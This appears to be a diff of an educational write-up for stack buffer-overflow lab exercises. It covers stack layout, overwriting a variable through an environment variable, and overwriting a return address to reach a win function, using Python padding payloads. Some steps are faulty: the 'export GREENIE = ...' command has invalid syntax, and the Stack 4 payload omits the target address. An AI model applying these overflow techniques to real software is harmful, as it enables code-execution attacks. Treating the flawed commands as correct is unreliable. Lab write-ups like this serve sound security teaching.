@@ -30,10 +30,15 @@ The man page also warns that gets does not check for the size of the string!
 
 The program starts by initialising the stack. The stack looks like this. 
 ```C
-Data...
-buffer[64]
-modified
-More data...
++==============+
+|    Data      |
++--------------+
+|   modified   |
++--------------+
+|  buffer[64]  |
++--------------+
+|    Data      |
++==============+
 ```
 Since this a 32 bit system, modified will be 4 bytes (32 bits = 4 bytes). So we can type 1 to 4 characters to overwrite it.
 The modified variable is right above the buffer, we need to write 64 characters to fill the buffer, then 1 character to change modified.
@@ -126,17 +131,17 @@ int main(int argc, char **argv)
 ```
 
 Reading through this program source, we get some idea of what is happening.
-The program is calling `getenv` with "GREENIE" as a parameter. If this is NULL, it exits, but if it isn't NULL, it copies it into a buffer.
+The program is calling `getenv` with **GREENIE** as a parameter. If this is *NULL*, it exits, but if it isn't *NULL*, it copies it into a buffer.
 When you think about it, this isn't really different from Stack 1. This is just a new form of input. We can control things like the environment variables with the unix command `export`
 
-Like before we want to take into account the endianness of the computer. So we will enter 64 characters to fill the buffer, and then *0x0d0a0d0a* backwards -> 0x0a0d0a0d.
+Like before we want to take into account the endianness of the computer. So we will enter 64 characters to fill the buffer, and then *0x0d0a0d0a* backwards -> *0x0a0d0a0d*.
 
 We can use a python script to generate the string
 ```python
 python -c 'print("A"*64 + "\x0a\x0d\x0a\x0d")'
 ```
 We can run this python script inline, using backticks \` \`.
-So if we run ```export `python -c 'print("A"*64 + "\x0a\x0d\x0a\x0d")` ```
+So if we run ```export GREENIE = `python -c 'print("A"*64 + "\x0a\x0d\x0a\x0d")` ```
 Then execute the program. We win!
 
 ## Stack 3
@@ -191,4 +196,56 @@ This address is just a number. Now that we have a number to overwrite, this leve
 ```python
 python -c 'print "A"*64 + "\x24\x84\x04\x08"'
 ```
-Remember *little endianness**
+Remember *little endianness*
+
+
+## Stack 4
+
+Program source is supplied:
+```C
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+void win()  
+{
+  printf("code flow successfully changed\n");
+}
+
+int main(int argc, char **argv)  
+{
+  char buffer[64];
+
+  gets(buffer);
+}
+```
+Finally, a real challenge. 
+From a first glance this code looks perfectly fine, What could we possibly overwrite to get a jump into the `win` function.
+
+In Stack 0 I explained how the stack looks, how does it look here?
+```C
++==============+
+|    Data      |
++--------------+
+|  buffer[64]  |
++--------------+
+|    Data      |
++==============+
+```
+What is that `Data`?
+Data has a bunch of information on the current *stack frame*, including a base pointer, and our **return address**.
+
+If we could override the return address of the stack frame, we could change where the function *returns* to.
+
+Firstly we need to use `objdump` to find the address of **win** again.
+Running `objdump ... | grep win` yields **0x80483f4**
+
+Now we need to know how many bytes to override. We need to override the buffer which is 64 bytes, however the compiler will include random bytes to align the stack correctly. So we can trial and error how many letters to input before our program crashes.
+
+If we enter 80 letter A's it crashes, if we enter 75 it won't crash, if we enter 76 it does. So we have 76 bytes to override before our program seg faults, and crashes.
+
+Similar to before, we can compile a python script to output this data
+```python
+python -c 'print("A"*76 + "")'
+```
